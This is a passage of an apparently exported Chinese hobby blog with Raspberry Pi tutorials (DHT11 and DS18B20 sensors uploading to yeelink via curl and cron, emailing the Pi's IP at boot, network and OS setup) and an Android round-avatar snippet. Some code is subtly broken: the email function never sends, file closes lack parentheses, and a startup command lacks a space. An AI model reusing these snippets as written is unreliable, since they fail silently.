    <content type="text"><![CDATA[配置准备DHT11简介DHT11是一款有已校准数字信号输出的温湿度传感器。 精度湿度+-5%RH， 温度+-2℃，量程湿度20-90%RH， 温度0~50℃。 DHT11有四个引脚，分别是VCC，DATA，NC，GND 电路连接本博文中python程序使用的是BCM编号方式，17号即pin11接DHT11的DATA，VCC接3.3V，NC悬空，GND接0V，可通过下图找到对应引脚，进行连线。 用python读取温湿度数据关于DHT11具体的时序，以及如何操作，在我的博客《 51单片机DHT11温湿度传感器》中有详细分析，有兴趣可以去了解一下，以便你可以看懂下面的python程序。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/pythonimport RPi.GPIO as GPIOimport time#BCM编号方式的17对应树莓派的pin11channel = 17data = []j = 0#I/O口使用BCM编号方式GPIO.setmode(GPIO.BCM)time.sleep(1)#设置数据线为输出GPIO.setup(channel, GPIO.OUT)GPIO.output(channel, GPIO.LOW)time.sleep(0.02)GPIO.output(channel, GPIO.HIGH)#设置数据线为输入GPIO.setup(channel, GPIO.IN)while GPIO.input(channel) == GPIO.LOW: continuewhile GPIO.input(channel) == GPIO.HIGH: continuewhile j &lt; 40: k = 0 while GPIO.input(channel) == GPIO.LOW: continue while GPIO.input(channel) == GPIO.HIGH: k += 1 if k &gt; 100: break if k &lt; 8: data.append(0) else: data.append(1) j += 1print &quot;sensor is working.&quot;print data#读取数值humidity_bit = data[0:8]humidity_point_bit = data[8:16]temperature_bit = data[16:24]temperature_point_bit = data[24:32]check_bit = data[32:40]humidity = 0humidity_point = 0temperature = 0temperature_point = 0check = 0#转换数值for i in range(8): humidity += humidity_bit[i] * 2 ** (7 - i) humidity_point += humidity_point_bit[i] * 2 ** (7 - i) temperature += temperature_bit[i] * 2 ** (7 - i) temperature_point += temperature_point_bit[i] * 2 ** (7 - i) check += check_bit[i] * 2 ** (7 - i)tmp = humidity + humidity_point + temperature + temperature_point#数据校验if check == tmp: print &quot;temperature : &quot;, temperature, &quot;, humidity : &quot; , humidityelse: print &quot;wrong&quot; print &quot;temperature : &quot;, temperature, &quot;, humidity : &quot; , humidity, &quot; check : &quot;, check, &quot; tmp : &quot;, tmpGPIO.cleanup() 在python文件的路径下输入命令： 1sudo python ./dht11.py 即可获得数据，效果如图： 可以看到，当校验不正确时会打印出“wrong”，表示数据错误，在读取一次得到正常的数据。 上传数据到yeelink修改python代码在上面的代码后添加如下代码，即将温度和湿度数据保存到txt文件里： 123456789101112131415#数据转换成JSON格式mytemp = &apos;&#123;&quot;value&quot;:%f&#125;&apos; %temperaturemyhumi = &apos;&#123;&quot;value&quot;:%f&#125;&apos; %humidity#打开文件tmp_output = open(&apos;/home/pi/mytest/DHT11/tmp_data.txt&apos;, &apos;w&apos;)hud_output = open(&apos;/home/pi/mytest/DHT11/hud_data.txt&apos;, &apos;w&apos;)#写数据到文本文件中tmp_output.write(mytemp)hud_output.write(myhumi)#关闭文件tmp_output.closehud_output.close 新增yeelink.sh脚本yeelink是一个开源的硬件数据平台，我喜欢把它定义为一个物联网云平台，因为它给我们提供了API接口，我们可以把数据发送到云平台保存起来，也可以随时查看，真的很棒。具体的操作可以查看博主的博客：《 树莓派+USB摄像头+yeelink实现云监控》。 1234sudo python /home/pi/mytest/DHT11/dht11.pycurl --request POST --data-binary @&quot;/home/pi/mytest/DHT11/tmp_data.txt&quot; --header &quot;U-ApiKey:XXXXXXXXXXXXXXXX&quot; http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapointssleep 10scurl --request POST --data-binary @&quot;/home/pi/mytest/DHT11/hud_data.txt&quot; --header &quot;U-ApiKey:XXXXXXXXXXXXXXXX&quot; http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapoints “/home/pi/mytest/DHT11/tmp_data.txt”是需要上传到yeelink上的文件的路径，将XXXXXXXXXXXXXXXX替换为自已账户的API Key，后面的URL也需要替换为自己申请的传感器URL。 注意：因为DHT11可以获得温度和湿度两种值，所以我在yeelink添加了两个传感器，便于观察，在这里有两次上传数据，分别是把储存温度值得txt文本和储存湿度值得txt文本通过HTTP协议上传到云端。 为脚本增加可执行权限1sudo chmod +x yeelink.sh 将脚本加入cronjob定时任务1sudo crontab -e 让脚本自动运行加入下面一行, 让脚本每1分钟运行一次，即每1分钟上传一次数据，然后保存退出 1*/1 * * * * /home/pi/mytest/yeelink.sh 注：我给自己的实验新建了几个文件夹，路径如下：/home/pi/mytest/DHT11/，很多操作都是在这个路径下完成的。 实验效果： 温度： 湿度：]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,DHT11,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派+DS18B20温度传感器+yeelink物联网云]]></title>
    <url>%2F2016%2F05%2F30%2F%E6%A0%91%E8%8E%93%E6%B4%BE-DS18B20%E6%B8%A9%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8-yeelink%E7%89%A9%E8%81%94%E7%BD%91%E4%BA%91%2F</url>
    <content type="text"><![CDATA[本博文参考了网络上多篇树莓派操作DS18B20的博文，经过博主亲自实践，列出了详细的步骤，通过树莓派的单总线驱动来驱动DS18B20获取温度数据，并通过python读取温度值，上传到yeelink物联网云平台。 配置准备电路连接DS18B20有三个引脚：VCC，DQ，GND 其中VCC和DQ之间需接一个4K7的电阻，VCC接树莓派的3V3（pin1），DQ接GPIO4（pin7）,GND接GND（pin6） 升级内核首先升级内核(如果系统版本较新，可跳过这一步)（升级内核可能需要很长的时间）12sudo apt-get updatesudo apt-get upgrade 加载单总线驱动12sudo modprobe w1-gpiosudo modprobe w1-therm 注意： 系统升级后，有可能gpio读不了w1 解决办法： 打开/boot/config.txt 在最后一行手动添加这一行：dtoverlay=w1-gpio-pullup,gpiopin=4 12cd /bootsudo nano config.txt 然后保存退出，重启树莓派，再把DS18B20接上，再次加载驱动即可 查看设备是否工作12cd /sys/bus/w1/devices/ls 28-0000075a0d1c即为我使用的DS18B20的设备号 查看当前温度值进入到我的DSI8B20，使用命令查看数据 12cd 28-0000075a0d1ccat w1_slave 第二行的t=18437就是当前的温度值，要换算成摄氏度，除以1000，即当前温度为18437/1000=18.437摄氏度。 python读取温度值新建文件在/home/pi/目录下新建文件夹mytest，并在mytest下新建temp.py 123mkdir mytestcd mytesttouch temp.py 编辑temp.py1nano temp.py 编写代码123456789101112131415161718192021222324#-*-coding:utf8-*-#打开你的DS18B20的数据文件tfile = open(&quot;/sys/bus/w1/devices/28-0000075a0d1c/w1_slave&quot;)#读取文件所有内容text = tfile.read()#关闭文件tfile.close()#用换行符分割字符串成数组，并取第二行secondline = text.split(&quot;\n&quot;)[1]#用空格分割字符串成数组，并取最后一个，即t=18437temperaturedata = secondline.split(&quot; &quot;)[9]#取t=后面的数值，并转换为浮点型temperature = float(temperaturedata[2:])#转换单位为摄氏度temperature = temperature / 1000#打印值print temperature 执行python脚本读取温度1python temp.py 上传数据到yeelink云端yeelink是一个开源的硬件数据平台，我喜欢把它定义为一个物联网云平台，因为它给我们提供了API接口，我们可以把数据发送到云平台保存起来，也可以随时查看，真的很棒。具体的操作可以查看博主的博客：《 树莓派+USB摄像头+yeelink实现云监控》。 修改python代码将温度值用JSON格式保存到一个文本文件（/home/pi/mytest/temper_data.txt），在转换单位为摄氏度后添加如下代码： 1234567891011#数据转换成JSON格式res = &apos;&#123;&quot;value&quot;:%f&#125;&apos; %temperature#打开文件output = open(&apos;/home/pi/mytest/temper_data.txt&apos;, &apos;w&apos;)#写数据到文本文件中output.write(res)#关闭文件output.close 新增yeelink.sh脚本在/home/pi/mytest/目录下新建yeelink.sh 写入如下内容： 12sudo python /home/pi/mytest/temp.pycurl --request POST --data-binary @&quot;/home/pi/mytest/temper_data.txt&quot; --header &quot;U-ApiKey:XXXXXXXXXXXXXXXX&quot; http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapoints 将XXXXXXXXXXXXXXXX替换为自已账户的API Key，后面的URL也需要替换为自己申请的传感器URL。 为脚本增加可执行权限1sudo chmod +x yeelink.sh 将脚本加入cronjob定时任务1sudo crontab -e 让脚本自动运行加入下面一行, 让脚本每1分钟运行一次，即每1分钟上传一次温度数据，然后保存退出 1*/1 * * * * /home/pi/mytest/yeelink.sh 实验效果：]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,DS18B20,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派自动发送ip到指定邮箱]]></title>
    <url>%2F2016%2F05%2F26%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81ip%E5%88%B0%E6%8C%87%E5%AE%9A%E9%82%AE%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[知道树莓派的ip地址才能通过SSH或者VNC在你的电脑上操作树莓派，树莓派开机自动发送ip地址到指定邮箱会让你使用树莓派更加方便！ 新建一个python脚本文件输入命令 1touch send_ip.py 编写python脚本（1）输入命令 1sudo vim send_ip.py （2）写入以下代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!\usr\bin\env python#-*-coding: utf-8-*-import socketimport timeimport smtplibimport urllibfrom email.mime.multipart import MIMEMultipartfrom email.mime.text import MIMETextfrom email.mime.image import MIMEImage#发送邮件的基本函数，参数依次如下# smtp服务器地址、邮箱用户名，邮箱秘密，发件人地址，手贱儿女地址（列表的方式），邮件主题，邮件html内容def sendEmail(smtpserver,username,password,sender,receiver,subject,msghtml): msgRoot =MIMEMultipart(&apos;reklated&apos;) msgRoot[&apos;To&apos;]=&apos;,&apos;.join(receiver) msgRoot[&apos;Subject&apos;]= subject msgText = MIMEText(msghtml,&apos;html&apos;,&apos;utf-8&apos;) msgRoot.attach(msgText) smtp = smtplib.SMTP() smtp.connect(smtpserver,&quot;25&quot;) smtp.login(username,password) print &quot;YES&quot; smtp.quit()#检查网络连通性def check_network(): while True: try: result=urllib.urlopen(&apos;http://baidu.com&apos;).read() print result print &quot;Network is Ready!&quot; break except Exception , e: print e print &quot;Network is not ready,Sleep 5s...&quot; time.sleep(5) return True#获取本级制定接口的ip地址def get_ip_address(): s =socket.socket(socket.AF_INET,socket.SOCK_DGRAM) s.connect((&quot;1.1.1.1&quot;,80)) ipaddr=s.getsockname()[0] s.close() return ipaddrif __name__ == &apos;__main__&apos; : check_network() ipaddr= get_ip_address() sendEmail(&quot;smtp.sohu.com&quot;,&apos;你的邮箱帐号&apos;,&apos;你的邮箱密码&apos;,&apos;发件人地址&apos;,[&apos;收件人地址&apos;],&apos;IP Address of Raspberry PI&apos;,ipaddr) （3）保存退出 vim编辑器下保存退出步骤为： 按esc然后输入：，然后看到冒号显示出来再输入wq，回车即可 设置开机自动执行该脚本在/etc/rc.local文件里加入下面这一行： 1/usr/bin/python/home/pi/send_ip.py 输入命令： 1sudo vim /etc/rc.local 在文件中添加/usr/bin/python/home/pi/send_ip.py然后保存退出 特别提示：收到的邮件有可能在垃圾箱里，不要以为是脚本的问题，其实是邮箱的问题，请注意查看！另外，有的邮箱不支持smtp，所以无法使用。搜狐和网易的邮箱亲测可用。]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,ip］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派网线直连笔记本电脑]]></title>
    <url>%2F2016%2F05%2F23%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E7%BD%91%E7%BA%BF%E7%9B%B4%E8%BF%9E%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%94%B5%E8%84%91%2F</url>
    <content type="text"><![CDATA[查看网络连接状况运行DOS窗口，输入arp -a，可以看到没有连接树莓派时的网络连接情况。红色方框为笔记本连接无线网络的网络信息。 连线树莓派接好供电线；将网线一端接到树莓派，另一端接到笔记本。 共享无线网络如果现在笔记本已经通过WIFI连接到互联网，可以将无线网卡的互联网资源共享给本地连接。以win7系统为例，开始——控制面板——网络和Internet——网络和共享中心——查看网络状态和任务——更改适配器设置，找到无线网络连接右键“属性”，在共享选项卡上选中“允许其他网络用户通过此计算机的Internet连接来连接（N）”选项，下拉列表选择树莓派的那个网络，最后点确定。 查找树莓派的IP地址运行DOS窗口，输入arp -a，在这里可以看到在笔记本无线网络信息的上面（红色标注）多出来一个接口（蓝色标注），黄色标注的ip地址即为树莓派的ip地址。 利用Xshell或者PuTTY软件连接树莓派通过树莓派的ip地址登录到树莓派，树莓派的默认账号为pi，密码为raspberry。登录后可以看到树莓派操作系统的命令行界面。 图形化界面连接树莓派端： 在命令行界面安装VNCserver （1）安装VNC 1sudo apt-get install tightvncserver （2）增加一个桌面 1tightvncserver （3）启动VNC服务器 1vncserver 首次使用时需设置密码，当提示输入密码时，创建一个密码 (这个密码是远程用户访问时用的） （4）关闭VNC服务器 1vncserver -kill PC端： 在windows上下载安装下载VNC viewer地址http://www.tightvnc.com/download.php： （1）下载Window版的 VNC-Viewer ，无需安装，解压即可。 比如，解压出：VNC-Viewer-5.0.3-Windows-32bit.exe 。 （2）运行 VNC-Viewer 。 （3）输入树莓派的ip地址以及访问密码，即可登录到树莓派，并显示图形化界面。]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,网络］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派配置无线网卡]]></title>
    <url>%2F2016%2F05%2F22%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E9%85%8D%E7%BD%AE%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%2F</url>
    <content type="text"><![CDATA[查看无线网卡状态把无线网卡插到树莓派上，输入命令ifconfig 查看是否有wlan0的信息，如果有说明网卡状态正常，可以直接进行第二步，直接配置无线网络。如果看不到wlan0的信息，则需要根据无线网卡型号安装驱动。 修改interfaces文件（1）用编辑器nano打开interfaces文件输入命令：sudo nano /etc/network/interfaces （2）把该文件内容修改成如下： 12345678910auto lo iface lo inet loopbackiface eth0 inet dhcp #采用dhcp方式获取IPauto wlan0 #如果有wlan，无线网卡，则默认启动无线网卡连接allow-hotplug wlan0 #表示wlan设备可以热插拨iface wlan0 inet dhcp #无线网卡连接也采用DHCP方式获取IP地址wpa-ssid &quot;你的wifi名字&quot; #ssid名wpa-psk &quot;wifi密码&quot; #wifi使用wpa-psk认证方式，认证密码iface default inet dhcp （3）保存，退出 启用无线网（1）用 ifconfig 命令可以看到 wlan0 设备，且有了IP地址(即表示已连接)。 （2）如果没有IP地址，则依次输入命令：sudo ifdown wlan0和sudo ifup wlan0来启用wlan0 （3）如果还不行，执行命令sudo reboot重启即可连上无线网络]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,无线］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派安装Linux操作系统]]></title>
    <url>%2F2016%2F05%2F18%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[树莓派上可安装的操作系统（1）Linux：Raspbian,Arch Linux ARM （2）Unix：FreeBSD,NetBSD （3）Windows: Windows 10 for Raspberry Pi 2 其中： 使用最广泛：Raspbian——基于Debian，为树莓派优化 强调定制性：Arch Linux ARM——为轻量，简洁，定制而生 Raspbmc——用Kodi（XBMC/Xbox Media Center）打造多媒体中心 Chromium OS——云端操作系统，中国大陆用户不方便使用 Windows 10 loT物联网版本 Linux操作系统安装方法使用NOOBS来安装系统（1）将TF卡格式化为FAT32格式 注意：TF（micro SD）卡需要大于等于4GB，而且并不是所有TF卡都能兼容树莓派，需百度查询兼容性列表 （2） 到树莓派官网下载NOOBS（进入主页后点击DOWNLOAD就可以看到NOOBS了） （3）将NOOBS解压后的所有文件拷贝到TF卡的根目录下 （4）连接显示器，并给树莓派上电（5V，2A电源，也可直接使用电脑的USB插口） （5）初始化完成以后，你会进入NOOBS助手界面 （6）选择你需要安装的操作系统，然后点击上方的install OS即可进入安装 （7）完成后点击确认，然后Raspberry Pi会重启，至此系统安装完成 直接安装Linux系统到SD卡（1）到树莓派官网下载你需要的官方系统镜像 （2）下载安装镜像的工具win32diskimager （3）运行Win32DiskImager，在软件中选择系统镜像（img文件），然后device(设备）下选择TF卡盘符，点击write，等待写入完全，等到出现对话框write successful就说明成功了。 注意：写入完成后，win系统下看到SD只有几十MB了，这是正常现象，因为linux下的分区win下是看不到的！ （4）连接显示器，并给树莓派上电，至此系统安装完成]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,Linux］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android ImageView实现圆形头像]]></title>
    <url>%2F2016%2F05%2F17%2FAndroid-ImageView%E5%AE%9E%E7%8E%B0%E5%9C%86%E5%BD%A2%E5%A4%B4%E5%83%8F%2F</url>
    <content type="text"><![CDATA[原理解析先在canvas上面画一个圆形，参照圆形的起点坐标、半径，再画一个边长为圆的直径的bitmap（这个bitmap就是你想画的圆形头像），此时圆和bitmap重叠在一起，圆在下面，bitmap在上面，bitmap覆盖着圆。 这时，圆形和bitmap相交的部分正是圆大小的面积，如果能将bitmap与圆相交之外的部分去掉，那么我们看到的就是bitmap的圆形部分了。 代码实现1234567891011121314151617181920212223242526272829303132public Bitmap toRoundBitmap(Bitmap bitmap) &#123; //圆形图片宽高 int width = bitmap.getWidth(); int height = bitmap.getHeight(); //正方形的边长 int r = 0; //取最短边做边长 if(width &amp;amp;amp;gt; height) &#123; r = height; &#125; else &#123; r = width; &#125; //构建一个bitmap Bitmap backgroundBmp = Bitmap.createBitmap(width, height, Config.ARGB_8888); //new一个Canvas，在backgroundBmp上画图 Canvas canvas = new Canvas(backgroundBmp); Paint paint = new Paint(); //设置边缘光滑，去掉锯齿 paint.setAntiAlias(true); //宽高相等，即正方形 RectF rect = new RectF(0, 0, r, r); //通过制定的rect画一个圆角矩形，当圆角X轴方向的半径等于Y轴方向的半径时， //且都等于r/2时，画出来的圆角矩形就是圆形 canvas.drawRoundRect(rect, r/2, r/2, paint); //设置当两个图形相交时的模式，SRC_IN为取SRC图形相交的部分，多余的将被去掉 paint.setXfermode(new PorterDuffXfermode(Mode.SRC_IN)); //canvas将bitmap画在backgroundBmp上 canvas.drawBitmap(bitmap, null, rect, paint); //返回已经绘画好的backgroundBmp return backgroundBmp; &#125; 使用详解从res目录下的drawable文件夹获取图片资源进行转换1234567891011// 以数据流的方式读取bitmap资源Resources r = this.getResources();InputStream is = r.openRawResource(R.drawable.iv_head);BitmapDrawable bmpDraw = new BitmapDrawable(is);Bitmap bmp = bmpDraw.getBitmap(); // 将图片转换成圆形图片Bitmap bm = toRoundBitmap(bmp); //传给imagview进行显示imageview.setImageBitmap(bm); 从sdcard中获取图片资源进行转换注意：需添加sdcard读取数据的权限 1234567Bitmap bmp = BitmapFactory.decodeFile(path) (path 是图片的路径，根目录是/sdcard) // 将图片转换成圆形图片Bitmap bm = toRoundBitmap(bmp); //传给imagview进行显示imageview.setImageBitmap(bm);]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,ImageView］</tag>
      </tags>
  </entry>
</search>
